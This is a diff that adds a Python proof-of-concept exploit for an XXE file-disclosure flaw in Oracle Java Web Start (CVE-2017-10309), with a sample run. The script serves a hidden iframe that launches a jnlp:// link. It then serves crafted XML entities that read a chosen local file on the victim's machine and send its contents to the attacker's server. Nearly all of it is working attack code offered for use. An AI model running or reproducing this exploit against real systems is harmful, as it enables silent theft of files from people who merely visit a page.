@@ -1,0 +1,158 @@
+#!/usr/local/bin/python
+"""
+Oracle Java SE Web Start jnlp XML External Entity Processing Information Disclosure Vulnerability
+Affected:   <= v8u131
+File:       jre-8u131-windows-i586-iftw.exe
+SHA1:       85f0de19845deef89cc5a29edebe5bb33023062d
+Download:   http://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html
+References: SRC-2017-0028 / CVE-2017-10309
+Advisory:   http://srcincite.io/advisories/src-2017-0028/
+
+Vulnerability Details:
+======================
+
+Java SE installs a protocol handler in the registry as "HKEY_CLASSES_ROOT\jnlp\Shell\Open\Command\Default" 'C:\Program Files\Java\jre1.8.0_131\bin\jp2launcher.exe" -securejws "%1"'. 
+This can allow allow an attacker to launch remote jnlp files with little user interaction. A malicious jnlp file containing a crafted XML XXE attack to be leveraged to disclose files, cause a denial of service or trigger SSRF.
+
+Notes:
+======
+
+- It will take a few seconds to fire.
+- Some browsers will give a small, innocent looking popup (not a security alert), but IE/Edge doesn't at all.
+
+Example:
+========
+
+saturn:~ mr_me$ ./poc.py 
+
+    Oracle Java Web Start JNLP XML External Entity Processing Information Disclosure Vulnerability
+    mr_me 2017
+
+(+) usage: ./poc.py <file>
+(+) eg: ./poc.py 'C:/Program Files/Java/jre1.8.0_131/README.txt'
+
+saturn:~ mr_me$ ./poc.py 'C:/Program Files/Java/jre1.8.0_131/README.txt'
+
+    Oracle Java Web Start JNLP XML External Entity Processing Information Disclosure Vulnerability
+    mr_me 2017
+
+(+) select your interface: lo0, gif0, stf0, en0, en1, en2, bridge0, p2p0, awdl0, vmnet1, vmnet8, tap0: vmnet8
+(+) starting xxe server...
+(+) have someone with Java SE installed visit: http://172.16.175.1:9090/
+(!) firing webstart...
+(!) downloading jnlp...
+(!) downloading si.xml...
+(+) stolen: Please%20refer%20to%20http://java.com/licensereadme
+^C(+) shutting down the web server
+saturn:~ mr_me$
+"""
+
+import sys
+import socket
+import fcntl
+import struct
+from random import choice
+from string import lowercase
+from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
+
+try:
+    import netifaces as ni
+except:
+    print "(-) try 'pip install netifaces'"
+    sys.exit(1)
+
+class xxe(BaseHTTPRequestHandler):
+
+    # stfu
+    def log_message(self, format, *args):
+        return
+
+    def do_GET(self):
+
+        if "leaked" in self.path:
+            print "(+) stolen: %s" % self.path.split("?")[1]
+            self.send_response(200)
+            self.end_headers()
+
+        elif self.path == "/":
+            print "(!) firing webstart..."
+            self.send_response(200)
+            self.end_headers()
+            message = """
+            <html>
+            <body>
+            <iframe src="jnlp://%s:9090/%s" style="width:0;height:0;border:0; border:none;"></iframe>
+            </body>
+            </html>
+            """ % (ip, path)
+            self.wfile.write(message)
+            self.wfile.write('\n')
+
+        elif "si.xml" in self.path:
+            print "(!) downloading si.xml..."
+            self.send_response(200)
+            self.end_headers()
+            message = """
+            <!ENTITY %% data SYSTEM "file:///%s">
+            <!ENTITY %% param1 "<!ENTITY &#x25; exfil SYSTEM 'http://%s:9090/leaked?%%data;'>">
+            """ % (file, ip)
+            self.wfile.write(message)
+            self.wfile.write('\n')
+
+        elif path in self.path:
+            print "(!) downloading jnlp..."
+            self.send_response(200)
+            self.end_headers()
+            message = """
+            <?xml version="1.0" ?>
+            <!DOCTYPE r [
+            <!ELEMENT r ANY >
+            <!ENTITY %% sp SYSTEM "http://%s:9090/si.xml">
+            %%sp;
+            %%param1;
+            %%exfil;
+            ]>
+            """ % ip
+            self.wfile.write(message)
+            self.wfile.write('\n')
+        return
+
+def banner():
+    return """\n\tOracle Java Web Start JNLP XML External Entity Processing Information Disclosure Vulnerability\n\tmr_me 2017\n"""
+
+if __name__ == '__main__':
+
+    print banner()
+
+    if len(sys.argv) != 2:
+        print "(+) usage: %s <file>" % sys.argv[0]
+        print "(+) eg: %s 'C:/Program Files/Java/jre1.8.0_131/README.txt'" % sys.argv[0]
+        sys.exit(1)
+
+    file = sys.argv[1]
+
+    # randomize incase we change payloads and browser caches
+    path  = "".join(choice(lowercase) for i in range(10))
+    path += ".jnlp"
+
+    # interfaces
+    ints = ""
+    for i in ni.interfaces(): ints += "%s, " % i
+    interface = raw_input("(+) select your interface: %s: " % ints[:-2])
+
+    # get the ip from the interface
+    try:
+        ip = ni.ifaddresses(interface)[2][0]['addr']
+    except:
+        print "(-) no ip address associated with that interface!"
+        sys.exit(1)
+    print "jnlp://%s:9090/%s" % (ip, path)
+    try:
+        server = HTTPServer(('0.0.0.0', 9090), xxe)
+        print '(+) starting xxe server...'
+        print '(+) have someone with Java SE installed visit: http://%s:9090/' % ip
+        server.serve_forever()
+
+    except KeyboardInterrupt:
+        print '(+) shutting down the web server'
+        server.socket.close()
